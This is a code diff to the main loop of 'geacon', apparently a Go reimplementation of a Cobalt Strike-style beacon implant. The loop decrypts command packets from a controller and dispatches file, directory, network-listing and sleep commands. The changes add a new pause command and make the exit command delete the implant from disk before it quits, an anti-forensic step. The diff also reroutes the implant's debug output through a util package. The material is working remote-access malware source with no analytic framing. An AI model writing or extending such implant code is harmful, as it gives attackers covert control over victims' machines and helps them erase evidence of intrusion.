@@ -3,7 +3,6 @@ package main
 import (
 	"bytes"
 	"encoding/binary"
-	"fmt"
 	"main/command"
 	"main/packet"
 	"main/sysinfo"
@@ -16,6 +15,7 @@ import (
 func main() {
 	// set rand seed at beginning of the program
 	rand.Seed(time.Now().UnixNano())
+	_ = util.Sprintf("hahahahahahaaaaaaaaa")
 	ok := packet.FirstBlood()
 	if ok {
 		for {
@@ -27,13 +27,13 @@ func main() {
 					respByte := resp
 					// hmacHash, useless
 					_ = respByte[totalLen-util.HmacHashLen:]
-					//fmt.Printf("hmac hash: %v\n", hmacHash)
+					//util.Printf("hmac hash: %v\n", hmacHash)
 					// TODO check the hmachash
 					restBytes := respByte[:totalLen-util.HmacHashLen]
 					decrypted := packet.DecryptPacket(restBytes)
 					// first 4 bytes timestamp,useless
 					_ = decrypted[:4]
-					//fmt.Printf("timestamp: %v\n", timestamp)
+					//util.Printf("timestamp: %v\n", timestamp)
 					// 4 bytes data length
 					lenBytes := decrypted[4:8]
 					packetLen := binary.BigEndian.Uint32(lenBytes)
@@ -45,13 +45,13 @@ func main() {
 						}
 						cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)
 						if cmdBuf != nil {
-							fmt.Printf("Cmd type %d\n", cmdType)
+							util.Printf("Cmd type %d\n", cmdType)
 							if len(cmdBuf) > 100 {
-								fmt.Printf("Cmd buffer: %s\n", cmdBuf[:100])
-								fmt.Printf("Cmd buffer bytes: %v\n", cmdBuf[:100])
+								util.Printf("Cmd buffer: %s\n", cmdBuf[:100])
+								util.Printf("Cmd buffer bytes: %v\n", cmdBuf[:100])
 							} else {
-								fmt.Printf("Cmd buffer: %s\n", cmdBuf)
-								fmt.Printf("Cmd buffer bytes: %v\n", cmdBuf)
+								util.Printf("Cmd buffer: %s\n", cmdBuf)
+								util.Printf("Cmd buffer bytes: %v\n", cmdBuf)
 							}
 							var execErr error
 							execErr = nil
@@ -136,15 +136,18 @@ func main() {
 								execErr = command.MakeDir(string(cmdBuf))
 							case command.CMD_TYPE_SLEEP:
 								command.ChangeSleep(cmdBuf)
+							case command.CMD_TYPE_PAUSE:
+								command.Pause(cmdBuf)
 							case command.CMD_TYPE_PWD:
 								execErr = command.GetCurrentDirectory()
 							case command.CMD_TYPE_LIST_NETWORK:
 								execErr = command.GetNetworkInformation(cmdBuf)
 							case command.CMD_TYPE_EXIT:
 								packet.PushResult(packet.CALLBACK_DEAD, []byte("exit"))
+								command.DeleteSelf()
 								os.Exit(0)
 							default:
-								errMsg := fmt.Sprintf("command type %d is not support by geacon now\n", cmdType)
+								errMsg := util.Sprintf("command type %d is not support by geacon now\n", cmdType)
 								packet.ErrorMessage(errMsg)
 							}
 							if execErr != nil {
